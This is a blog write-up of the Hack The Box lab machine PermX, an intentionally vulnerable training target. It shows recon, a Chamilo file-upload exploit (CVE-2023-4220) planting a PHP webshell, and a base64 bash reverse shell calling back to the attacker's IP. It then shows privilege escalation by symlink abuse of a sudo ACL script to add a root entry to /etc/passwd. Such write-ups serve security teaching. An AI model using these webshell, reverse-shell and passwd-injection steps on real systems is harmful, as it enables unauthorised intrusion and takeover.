---
title: HTB: PermX
url: https://0xdf.gitlab.io/2024/11/02/htb-permx.html
date: 2024-11-02T13:45:00+00:00
difficulty: Easy [20]
os: Linux
tags: htb-permx, hackthebox, ctf, nmap, ubuntu, ffuf, subdomain, feroxbuster, chamilo, php, cve-2023-31803, webshell, facl, passwd, arbitrary-write, setfacl, getfacl, cron, sudoers, htb-altered
---

![PermX](/img/permx-cover.png)

PermX starts with an online education platform, Chamilo. I’ll exploit a file upload vulnerability to get a webshell and execution on the box. From there, I’ll pivot on shared credentials to the next user. To escalate to root, I’ll abuse a script that allows me to mess with Linux file access control lists using symbolic links to bypass protections. I’ll show several ways to abuse this, and a couple ways that don’t work and show why.

## Box Info

| Name | [PermX](https://hackthebox.com/machines/permx)  [PermX](https://hackthebox.com/machines/permx) [Play on HackTheBox](https://hackthebox.com/machines/permx) |
| --- | --- |
| Release Date | [06 Jul 2024](https://twitter.com/hackthebox_eu/status/1809154019606003831) |
| Retire Date | 02 Nov 2024 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for PermX |
| Radar Graph | Radar chart for PermX |
| First Blood User | 00:09:23[NLTE NLTE](https://app.hackthebox.com/users/260094) |
| First Blood Root | 00:17:16[NLTE NLTE](https://app.hackthebox.com/users/260094) |
| Creator | [mtzsec mtzsec](https://app.hackthebox.com/users/1573153) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.23
Starting Nmap 7.80 ( https://nmap.org ) at 2024-07-06 21:38 EDT
Nmap scan report for 10.10.11.23
Host is up (0.087s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.90 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.23
Starting Nmap 7.80 ( https://nmap.org ) at 2024-07-06 21:38 EDT
Nmap scan report for 10.10.11.23
Host is up (0.087s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://permx.htb
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.82 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 22.04 jammy.

There’s a redirect on the webserver to `permx.htb`.

### Subdomain Fuzz - TCP 80

Because the site is clearly routing HTTP requests based on the hostname, I’ll use `ffuf` to fuzz subdomains of `permx.htb` to see if any respond differently:

```

oxdf@hacky$ ffuf -u http://10.10.11.23 -H "Host: FUZZ.permx.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.23
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.permx.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 88ms]
lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 122ms]
:: Progress: [19966/19966] :: Job [1/1] :: 458 req/sec :: Duration: [0:00:45] :: Errors: 0 ::

```

I’ll add the base domain as well as both subdomains to my `/etc/hosts` file:

```
10.10.11.23 permx.htb www.permx.htb lms.permx.htb

```

### permx.htb - TCP 80

#### www

The base domain and the `www` subdomain seem to return the same page:

```

oxdf@hacky$ curl -s permx.htb | wc 
    586    2466   36182
oxdf@hacky$ curl -s www.permx.htb | wc 
    586    2466   36182
oxdf@hacky$ curl -s permx.htb | md5sum
71646e5bbcf317ff2aea64b6be02b1dc  -
oxdf@hacky$ curl -s www.permx.htb | md5sum
71646e5bbcf317ff2aea64b6be02b1dc  -

```

I’ll keep this in mind, but for now assume they are the same.

#### Site

The site is for an e-learning platform:

![image-20240706215021889](/img/image-20240706215021889.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

There are links to several pages such as “About” and “Courses”. The HTML from these pages seems to match exactly parts of the main page. The “Join Now” link just goes back to the main page.

There is a “Contact” page with a form, but submitting it just sends a GET request to `contact.html` without any of the data from the form.

#### Tech Stack

The main page is `index.html`. The other pages are also `.html`, such as `about.html`. The site seems to just be static pages.

The 404 page is the default Apache 404:

![image-20240706215304601](/img/image-20240706215304601.png)

Interestingly, there is actually a `404.html` page (I’ll discover with `feroxbuster` below), but the site doesn’t seem to use it:

![image-20240706215407792](/img/image-20240706215407792.png)

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x html` since I know the site seems static:

```

oxdf@hacky$ feroxbuster -u http://permx.htb -x html --dont-extract-links
                                                                                                                      
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://permx.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💲  Extensions            │ [html]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      271c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      303c http://permx.htb/js => http://permx.htb/js/
301      GET        9l       28w      304c http://permx.htb/css => http://permx.htb/css/
301      GET        9l       28w      304c http://permx.htb/img => http://permx.htb/img/
200      GET      587l     2466w    36182c http://permx.htb/
301      GET        9l       28w      304c http://permx.htb/lib => http://permx.htb/lib/
200      GET      275l      899w    14753c http://permx.htb/contact.html
200      GET      367l     1362w    20542c http://permx.htb/about.html
200      GET      208l      701w    10428c http://permx.htb/404.html
[####################] - 2m    150000/150000  0s      found:12      errors:0      
[####################] - 2m     30000/30000   294/s   http://permx.htb/ 
[####################] - 0s     30000/30000   348837/s http://permx.htb/js/ => Directory listing (add --scan-dir-listings to scan) (remove --dont-extract-links to scan)
[####################] - 0s     30000/30000   344828/s http://permx.htb/css/ => Directory listing (add --scan-dir-listings to scan) (remove --dont-extract-links to scan)
[####################] - 0s     30000/30000   340909/s http://permx.htb/img/ => Directory listing (add --scan-dir-listings to scan) (remove --dont-extract-links to scan)
[####################] - 0s     30000/30000   348837/s http://permx.htb/lib/ => Directory listing (add --scan-dir-listings to scan) (remove --dont-extract-links to scan)

```

Nothing new here.

### lms.permx.htb

#### Site

This site offers a login form for an instance of Chamilo:

![image-20240706215716291](/img/image-20240706215716291.png)

At the bottom, I’ll get the administrator name “Davis Miller” with the email “admin@permx.htb”.

[Chamilo](https://chamilo.org/en/) is a PHP-based online training platform. It is also [hosted on GitHub](https://github.com/chamilo/chamilo-lms).

#### Version

Looking at the GitHub page, it seems that going to version 2.0 is a big change:

![image-20240706222913987](/img/image-20240706222913987.png)

So while the main branch is tracking version 2.0, there’s a branch for the stable version 1.11.x as well.

There’s a file at `http://lms.permx.htb/README.md`, which I can download:

```

oxdf@hacky$ wget lms.permx.htb/README.md
--2024-07-06 22:31:33--  http://lms.permx.htb/README.md
Resolving lms.permx.htb (lms.permx.htb)... 10.10.11.23
Connecting to lms.permx.htb (lms.permx.htb)|10.10.11.23|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8074 (7.9K) [text/markdown]
Saving to: ‘README.md’

README.md                           100%[=================================================================>]   7.88K  --.-KB/s    in 0s      

2024-07-06 22:31:33 (789 MB/s) - ‘README.md’ saved [8074/8074]
oxdf@hacky$ cat README.md
# Chamilo 1.11.x

![PHP Composer](https://github.com/chamilo/chamilo-lms/workflows/PHP%20Composer/badge.svg?branch=1.11.x)
[![Scrutinizer Code Quality](https://scrutinizer-ci.com/g/chamilo/chamilo-lms/badges/quality-score.png?b=1.11.x)](https://scrutinizer-ci.com/g/chamilo/chamilo-lms/?branch=1.11.x)
[![Bountysource](https://www.bountysource.com/badge/team?team_id=12439&style=raised)](https://www.bountysource.com/teams/chamilo?utm_source=chamilo&utm_medium=shield&utm_campaign=raised)
[![Code Consistency](https://squizlabs.github.io/PHP_CodeSniffer/analysis/chamilo/chamilo-lms/grade.svg)](http://squizlabs.github.io/PHP_CodeSniffer/analysis/chamilo/chamilo-lms/)
[![CII Best Practices](https://bestpractices.coreinfrastructure.org/projects/166/badge)](https://bestpractices.coreinfrastructure.org/projects/166)
[![Codacy Badge](https://api.codacy.com/project/badge/Grade/88e934aab2f34bb7a0397a6f62b078b2)](https://www.codacy.com/app/chamilo/chamilo-lms?utm_source=github.com&utm_medium=referral&utm_content=chamilo/chamilo-lms&utm_campaign=badger)

## Installation

This installation guide is for development environments only.

### Install PHP, a web server and MySQL/MariaDB

To run Chamilo, you will need at least a web server (we recommend Apache2 for commodity reasons), a database server (we recommend MariaDB but will explain MySQL for commodity reasons) and a PHP interpreter (and a series of libraries for it). If you are working on a Debian-based system (Debian, Ubuntu, Mint, etc), just
type
‍```

sudo apt-get install apache2 mysql-server php libapache2-mod-php php-gd php-intl php-curl php-json php-mysql php-zip composer
‍```

### Install Git

The development version 1.11.x requires you to have Git installed. If you are working on a Debian-based system (Debian, Ubuntu, Mint, etc), just type
‍```

sudo apt-get install git
‍```

### Install Composer

To run the development version 1.11.x, you need Composer, a libraries dependency management system that will update all the libraries you need for Chamilo to the latest available version.

Make sure you have Composer installed. If you do, you should be able to launch "composer" on the command line and have the inline help of composer show a few subcommands. If you don't, please follow the installation guide at https://getcomposer.org/download/

### Download Chamilo from GitHub

Clone the repository

‍```

sudo mkdir chamilo-1.11
sudo chown -R `whoami` chamilo-1.11
git clone -b 1.11.x --single-branch https://github.com/chamilo/chamilo-lms.git chamilo-1.11
‍```

Checkout branch 1.11.x

‍```

cd chamilo-1.11
git checkout --track origin/1.11.x
git config --global push.default current
‍```

### Update dependencies using Composer

From the Chamilo folder (in which you should be now if you followed the previous steps), launch:

‍```

composer update
‍```

If you face issues related to missing JS libraries, you might need to ensure
that your web/assets folder is completely re-generated.
Use this set of commands to do that:
‍```

rm composer.lock
rm -rf web/ vendor/
composer clear-cache
composer update
‍```

This will take several minutes in the best case scenario, but should definitely
generate the missing files.

### Change permissions

On a Debian-based system, launch:
‍```

sudo chown -R www-data:www-data app main/default_course_document/images main/lang web
‍```

### Configure the web server

Enable the Apache web server module "rewrite" :
‍```

sudo a2enmod rewrite
sudo systemctl restart apache2.service
‍```

Chamilo's .htaccess must be obeyed.
Create /etc/apache2/conf-available/htaccessForChamilo.conf with these lines :
‍```

<Directory /var/www/html/chamilo-lms>
        AllowOverride All
</Directory>
‍```

then enable it :
‍```

sudo a2enconf htaccessForChamilo
sudo systemctl reload apache2.service
‍```

If you just installed missing PHP extensions using apt, you must restart the web server to get them loaded :
‍```

sudo systemctl restart apache2.service
‍```

### Start the installer

In your browser, load the Chamilo URL. You should be automatically redirected
to the installer. If not, add the "main/install/index.php" suffix manually in
your browser address bar. The rest should be a matter of simple
 OK > Next > OK > Next...

## Upgrade from 1.10.x
1.11.0 is a major version. It contains a series of new features, that
also mean a series of new database changes in regards with versions 1.10.x. As
such, it is necessary to go through an upgrade procedure when upgrading from
1.10.x to 1.11.x.

The upgrade procedure is relatively straightforward. If you have a 1.10.x
initially installed with Git, here are the steps you should follow
(considering you are already inside the Chamilo folder):
‍```

git fetch --all
git checkout origin 1.11.x
‍```

Then load the Chamilo URL in your browser, adding "main/install/index.php" and
follow the upgrade instructions. Select the "Upgrade from 1.10.x" button to
proceed.

If you have previously updated database rows manually, you might face issue with
FOREIGN KEYS during the upgrade process. Please make sure your database is
consistent before upgrading. This usually means making sure that you have to delete
rows from tables referring to rows which have been deleted from the user or access_url tables.
Typically:
<pre>
    DELETE FROM access_url_rel_course WHERE access_url_id NOT IN (SELECT id FROM access_url);
</pre>

### Upgrading from non-Git Chamilo 1.10 ###

In the *very unlikely* case of upgrading a "normal" Chamilo 1.10 installation (done with the downloadable zip package) to a Git-based installation, make sure you delete the contents of a few folders first. These folders are re-generated later by the ```composer update``` command. This is likely to increase the downtime of your Chamilo portal of a few additional minutes (plan for 10 minutes on a reasonable internet connection).

‍```

rm composer.lock
rm -rf web/*
rm -rf vendor/*
‍```

# For developers and testers only

This section is for developers only (or for people who have a good reason to use
a development version of Chamilo), in the sense that other people will not
need to update their Chamilo portal as described here.

## Updating code

To update your code with the latest developments in the 1.11.x branch, go to
your Chamilo folder and type:
‍```

git pull origin 1.11.x
‍```

If you have made customizations to your code before the update, you will have
two options:
- abandon your changes (use "git stash" to do that)
- commit your changes locally and merge (use "git commit" and then "git pull")

You are supposed to have a reasonable understanding of Git in order to
use Chamilo as a developer, so if you feel lost, please check the Git manual
first: http://git-scm.com/documentation

## Updating your database from new code

Since the 2015-05-27, Chamilo offers the possibility to make partial database
upgrades through Doctrine migrations.

To update your database to the latest version, go to your Chamilo root folder
and type
‍```

php bin/doctrine.php migrations:migrate --configuration=app/config/migrations.yml
‍```

If you want to proceed with a single migration "step" (the steps reside in
src/Chamilo/CoreBundle/Migrations/Schema/V110/), then check the datetime of the
version and type the following (assuming you want to execute Version20150527120703)
‍```

php bin/doctrine.php migrations:execute 20150527120703 --up --configuration=app/config/migrations.yml
‍```

You can also print the differences between your database and what it should be by issuing the following command from the Chamilo base folder:
‍```

php bin/doctrine.php orm:schema-tool:update --dump-sql
‍```

## Contributing

If you want to submit new features or patches to Chamilo, please follow the
Github contribution guide https://guides.github.com/activities/contributing-to-open-source/
and our CONTRIBUTING.md file.
In short, we ask you to send us Pull Requests based on a branch that you create
with this purpose into your repository forked from the original Chamilo repository.

# Documentation
For more information on Chamilo, visit https://1.11.chamilo.org/documentation/index.html

```

There are references to the 1.11.x version throughout this `README`. I’ll select that on GitHub:

![image-20240706223156066](/img/image-20240706223156066.png)

At the root, there’s a `documentation` directory, and it’s on PermX as well:

![image-20240706223232726](/img/image-20240706223232726.png)

The “Changelog” link goes to `/documentation/changelog.html`, which shows the version installed as likely 1.11.24:

![image-20240706223314345](/img/image-20240706223314345.png)

## Shell as www-data

### Identify CVE

Searching for “chamilo vulnerability” returns several CVEs:

![image-20240706223602006](/img/image-20240706223602006.png)

A page like [CVE details](https://www.cvedetails.com/vulnerability-list/vendor_id-12983/Chamilo.html) is useful to look at all of the CVEs and the versions that are vulnerable. There’s a series of vulnerabilities that apply up through 1.11.24, the version I suspect is on PermX:

![image-20240706223944299](/img/image-20240706223944299.png)

These are all authenticated. There is one more that is unauthenticated:

![image-20240706224100499](/img/image-20240706224100499.png)

### CVE-2023-4220

#### Background

[CVE-2023-4220](https://nvd.nist.gov/vuln/detail/CVE-2023-4220) allows a “stored cross-site scripting attack” to lead to remote code execution (RCE) via a webshell.

This [StarLabs advisory](https://starlabs.sg/advisories/23/23-4220/#proof-of-concept) goes into detail about the vulnerability. It’s not immediately clear to me why they call this a XSS. It is more just an unsanitized upload issue. An attacker can upload a file and control the name given, so it can end with `.php`.

For this attack to work, the folder `/main/inc/lib/javascript/bigupload/files` must exist.

#### PermX POC

I’ll first check that the necessary directory exists, and it does:

![image-20240706224658511](/img/image-20240706224658511.png)

It’s empty. I’ll create a simple PHP webshell:

```

<?php system($_REQUEST['cmd']); ?>

```

Now I’ll use `curl` to POST it as a file to the vulnerable page (following the example in the Starlabs advisory):

```

oxdf@hacky$ curl -F 'bigUploadFile=@0xdf.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
The file has successfully been uploaded.

```

I’ll test the webshell by accessing it with `curl`:

```

oxdf@hacky$ curl http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/0xdf.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

### Shell

#### Generate Payload

I’ll make a base64-encoded [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw):

```

oxdf@hacky$ echo 'bash  -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"' | base64 -w0
YmFzaCAgLWMgImJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSIK

```

I’ll test this by running the following on my machine and making sure I get a shell at a listening `nc`:

```

oxdf@hacky$ echo YmFzaCAgLWMgImJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSIK | base64 -d | bash

```

It works.

#### Execute

I’ll URL encode that by replacing the spaces with `+`, and send it over the webshell:

```

oxdf@hacky$ curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/0xdf.php?cmd=echo+YmFzaCAgLWMgImJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSIK|base64+-d|bash'

```

It hangs, but at `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.23 44392
bash: cannot set terminal process group (1168): Inappropriate ioctl for device
bash: no job control in this shell
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ 

```

I’ll upgrade the shell using [the standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```

www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ script /dev/null -c bash
<avascript/bigupload/files$ script /dev/null -c bash                      
Script started, output log file is '/dev/null'.
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
<milo/main/inc/lib/javascript/bigupload/files$ reset                          
reset: unknown terminal type unknown
Terminal type? screen
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$

```

## Shell as mtz

### Enumeration

#### Users

There is only one user with a home directory and a shell:

```

www-data@permx:/home$ ls
mtz
www-data@permx:/home$ grep 'sh$' /etc/passwd
root:x:0:0:root:/root:/bin/bash
mtz:x:1000:1000:mtz:/home/mtz:/bin/bash

```

www-data can’t access either the `mtz` directory or `/root`.

#### Websites

There are two folders in `/var/www`:

```

www-data@permx:/var/www$ ls
chamilo  html

```

`html` has the static site that is the `permx.htb`:

```

www-data@permx:/var/www$ ls html/
404.html  LICENSE.txt  READ-ME.txt  about.html  contact.html  courses.html  css  elearning-html-template.jpg  img  index.html  js  lib  scss  team.html  testimonial.html

```

`chamilo` has the instance of Chamilo:

```

www-data@permx:/var/www$ ls chamilo/
CODE_OF_CONDUCT.md  README.md             bin           cli-config.php  composer.lock  favicon.ico  license.txt    plugin      terms.php     vendor       whoisonline.php
CONTRIBUTING.md     app                   bower.json    codesize.xml    custompages    favicon.png  main           robots.txt  user.php      web          whoisonlinesession.php
LICENSE             apple-touch-icon.png  certificates  composer.json   documentation  index.php    news_list.php  src         user_portal.phpweb.config

```

The `cli-config.php` file doesn’t have any credentials, but it has a reference to another config file:

```

$configurationFile = __DIR__.'/app/config/configuration.php';

```

That file is very long, but it starts with the DB connection information:

```

<?php
// Chamilo version 1.11.24
// File generated by /install/index.php script - Sat, 20 Jan 2024 18:20:32 +0000                                                              
/* For licensing terms, see /license.txt */
/**
 * This file contains a list of variables that can be modified by the campus site's server administrator.                                     
 * Pay attention when changing these variables, some changes may cause Chamilo to stop working.                                               
 * If you changed some settings and want to restore them, please have a look at
 * configuration.dist.php. That file is an exact copy of the config file at install time.                                                     
 * Besides the $_configuration, a $_settings array also exists, that
 * contains variables that can be changed and will not break the platform.
 * These optional settings are defined in the database, now
 * (table settings_current).
 */

// Database connection settings.
$_configuration['db_host'] = 'localhost';
$_configuration['db_port'] = '3306';
$_configuration['main_database'] = 'chamilo';
$_configuration['db_user'] = 'chamilo';
$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
// Enable access to database management for platform admins.
$_configuration['db_manager_enabled'] = false;
...[snip]...

```

The password is “03F6lY3uXAP2bkW8”.

### su / SSH

That password is shared as the password for the mtz user. `su` will switch to that user:

```

www-data@permx:/var/www/chamilo$ su mtz
Password: 
mtz@permx:/var/www/chamilo$

```

The password also works over SSH:

```

oxdf@hacky$ sshpass -p '03F6lY3uXAP2bkW8' ssh mtz@permx.htb
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-113-generic x86_64)
...[snip]...
mtz@permx:~$

```

And I can read `user.txt`:

```

mtz@permx:~$ cat user.txt
0a5f7505************************

```

## Shell as root

### Enumeration

#### Home Directory

There isn’t anything of interest in mtz’s home directory:

```

mtz@permx:~$ ls -la
total 32
drwxr-x--- 4 mtz  mtz  4096 Jun  6 05:24 .
drwxr-xr-x 3 root root 4096 Jan 20 18:10 ..
lrwxrwxrwx 1 root root    9 Jan 20 18:12 .bash_history -> /dev/null
-rw-r--r-- 1 mtz  mtz   220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 mtz  mtz  3771 Jan  6  2022 .bashrc
drwx------ 2 mtz  mtz  4096 May 31 11:14 .cache
lrwxrwxrwx 1 root root    9 Jan 20 18:37 .mysql_history -> /dev/null
-rw-r--r-- 1 mtz  mtz   807 Jan  6  2022 .profile
drwx------ 2 mtz  mtz  4096 Jan 20 18:10 .ssh
-rw-r----- 1 root mtz    33 Jan 20 18:16 user.txt

```

#### sudo

mtz can run a Bash script as any user with `sudo`:

```

mtz@permx:~$ sudo -l
Matching Defaults entries for mtz on permx:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh

```

#### acl.sh

The script allows the user to set the file access control list (FACL) for a file:

```

#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"

```

### Background

#### ACLs in Linux

Linux permissions typically allow for setting each of read, write, and execute on or off for the object’s owner, the object’s group, and everyone, which is the standard line that comes from `ls -l`:

```

oxdf@hacky$ echo "Test" > test.txt
oxdf@hacky$ ls -l test.txt 
-rw-rw-r-- 1 oxdf oxdf 5 Jul  7 07:34 test.txt

```

Here, `test.txt` can be read and written by the oxdf user and oxdf group, and read by everyone.

There are also extended permissions (ACLs). These are read with `getfacl`:

```

oxdf@hacky$ getfacl test.txt 
# file: test.txt
# owner: oxdf
# group: oxdf
user::rw-
group::rw-
other::r--

```

If none are set, the output just shows the standard permissions. To add an extended permission, the `setfacl` command is used (just like in `acl.sh`):

```

oxdf@hacky$ setfacl -m dummy:wx test.txt 

```

I’ve just given the dummy user write and execute permissions over `text.txt`. `ls -l` will now show a `+` at the end of the permissions to indicate there are extended ACLs:

```

oxdf@hacky$ ls -l test.txt 
-rw-rwxr--+ 1 oxdf oxdf 5 Jul  7 07:34 test.txt

```

And `getfacl` adds another line with the permissions for dummy:

```

oxdf@hacky$ getfacl test.txt 
# file: test.txt
# owner: oxdf
# group: oxdf
user::rw-
user:dummy:-wx
group::rw-
mask::rwx
other::r--

```

#### test / [

In many Linux distributions, `[` is actually a binary that runs, and is very similar to the `test` binary:

```

oxdf@hacky$ which [
/usr/bin/[
oxdf@hacky$ ls -l /usr/bin/[ 
-rwxr-xr-x 1 root root 51648 Feb  7 22:46 '/usr/bin/['

```

`[` is the same as `test`, except that `[` must have `]` as the last argument.

While is it actually a binary, for efficiency it’s actually been built into most shells as a builtin as well. Bash has actually extended it with `[[`, another keyword providing more advanced comparison features, but that isn’t POSIX-compliant. Both of these are used in `acl.sh`.

For `test`, `-f` is defined as:

> -f FILE True if file exists and is a regular file.

One challenge with `test` is how to handle symbolic links. If I put `[ -f link]` in a script, am I asking it if `link` is a file, or if the file pointed to by `link` is a file? The authors of `test` / `[` chose to follow the link, also providing `-L` to check if the given file is a symbolic link.

To demonstrate, I’ll create a link to `test.txt`:

```

oxdf@hacky$ ln -s test.txt link
oxdf@hacky$ ls -l link test.txt 
lrwxrwxrwx  1 oxdf oxdf 8 Jul  7 07:51 link -> test.txt
-rw-rwxr--+ 1 oxdf oxdf 5 Jul  7 07:34 test.txt

```

Passing `-f` to `[` shows it still returns true:

```

oxdf@hacky$ if [ -f link ]; then echo "yay"; else echo "boo"; fi
yay

```

If I create a link to a file that doesn’t exist, it will return false (and print “boo”):

```

oxdf@hacky$ ln -s doesnotexist link2
oxdf@hacky$ if [ -f link2 ]; then echo "yay"; else echo "boo"; fi
boo

```

### Exploit

#### Paths

With access to set the ACL on any file, there are *many* paths I could take. I’ll show two, and one that doesn’t work:

```

flowchart TD;
    A[sudo /opt/acl.sh]--xB(<a href='#roottxt-fail'>Read\nroot.txt</a>);
    A-->C(<a href='#passwd'>passwd</a>);
    A-->D(<a href='#sudoers'>sudoers</a>);
    A-->F(<a href='#crontab'>crontab</a>);
    A-->G(<a href="#setuid-binary-fail">SetUID\nBinary</a>);
    C-->E[Shell as root];
    D-->E;
    F-->E;
    G--xE;

linkStyle default stroke-width:2px,stroke:#FFFF99,fill:none;

```

There’s also a cleanup job running every 3 minutes resetting a lot of these methods, which isn’t too annoying, but worth being aware of.

#### root.txt [Fail]

To abuse the script above, I’ll use a symbolic link to set permissions on a file I want access to. Unfortunately, I can’t just set permission on `root.txt` and read it:

```

mtz@permx:~$ ln -s /root/root.txt
mtz@permx:~$ ls -l
total 4
lrwxrwxrwx 1 mtz  mtz 14 Jul  7 12:01 root.txt -> /root/root.txt
-rw-r----- 1 root mtz 33 Jan 20 18:16 user.txt
mtz@permx:~$ sudo /opt/acl.sh mtz rwx /home/mtz/root.txt 
mtz@permx:~$ cat root.txt 
cat: root.txt: Permission denied

```

I can check later with a root shell and see that the permissions are set:

```

root@permx:~# getfacl root.txt 
# file: root.txt
# owner: root
# group: root
user::rw-
user:mtz:rwx
group::r--
mask::rwx
other::---

```

But without `x` access on `/root`, the mtz user can’t get to the file to read it. This also eliminates writing to files like `/var/spool/cron/crontabs/root`, as without access to `crontabs` (which is only accessible by root), mtz can’t open the file even if they have permission.

#### passwd

I’ve shown escalation via writable `/etc/passwd` file a few times before (most recently on [Holday Hack 2023](/holidayhack2023/scaredykite#modify-etcpasswd) and [HTB Altered](/2022/03/30/htb-altered.html#exploit-etcpasswd)). I’ll generate a hash for a simple password like “0xdf”:

```

mtz@permx:~$ openssl passwd -1 0xdf
$1$k3KMFmEw$AnPBUU.iz.aGzxKJ8IRjB1

```

Now I’ll make an entry for a `passwd` file:

```

mtz@permx:~$ echo 'oxdf:$1$k3KMFmEw$AnPBUU.iz.aGzxKJ8IRjB1:0:0:pwned:/root:/bin/bash'
oxdf:$1$k3KMFmEw$AnPBUU.iz.aGzxKJ8IRjB1:0:0:pwned:/root:/bin/bash

```

This user has user id 0 and group id 0, so it will be the root user.

I’ll make `passwd` writable, and add the line:

```

mtz@permx:~$ ln -s /etc/passwd
mtz@permx:~$ sudo /opt/acl.sh mtz rwx /home/mtz/passwd 

```

It worked:

```

mtz@permx:~$ getfacl /etc/passwd
getfacl: Removing leading '/' from absolute path names
# file: etc/passwd
# owner: root
# group: root
user::rw-
user:mtz:rwx
group::r--
mask::rwx
other::r--

```

I’ll add the new entry:

```

mtz@permx:~$ echo 'oxdf:$1$k3KMFmEw$AnPBUU.iz.aGzxKJ8IRjB1:0:0:pwned:/root:/bin/bash' >> /etc/passwd

```

Now when I change to the new user, I’m root:

```

mtz@permx:~$ su oxdf
Password: 
root@permx:/home/mtz#

```

And I can read `root.txt`:

```

root@permx:~# cat root.txt
7da72cb8************************

```

There’s a very similar attack to abuse `/etc/shadow`.

#### sudoers

The `/etc/sudoers` file controls who can run what with sudoers. By default, only root can read it:

```

mtz@permx:~$ cat /etc/sudoers
cat: /etc/sudoers: Permission denied
mtz@permx:~$ ls -l /etc/sudoers
-r--r----- 1 root root 1711 Jul  7 17:30 /etc/sudoers

```

I’ll give mtz permission:

```

mtz@permx:~$ ln -s /etc/sudoers
mtz@permx:~$ sudo /opt/acl.sh mtz rwx /home/mtz/sudoers

```

There’s a lot of comments, but cleaned up:

```

mtz@permx:~$ cat /home/mtz/sudoers | grep -v "^#" | grep .
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
Defaults        use_pty
root    ALL=(ALL:ALL) ALL
%admin ALL=(ALL) ALL
%sudo   ALL=(ALL:ALL) ALL
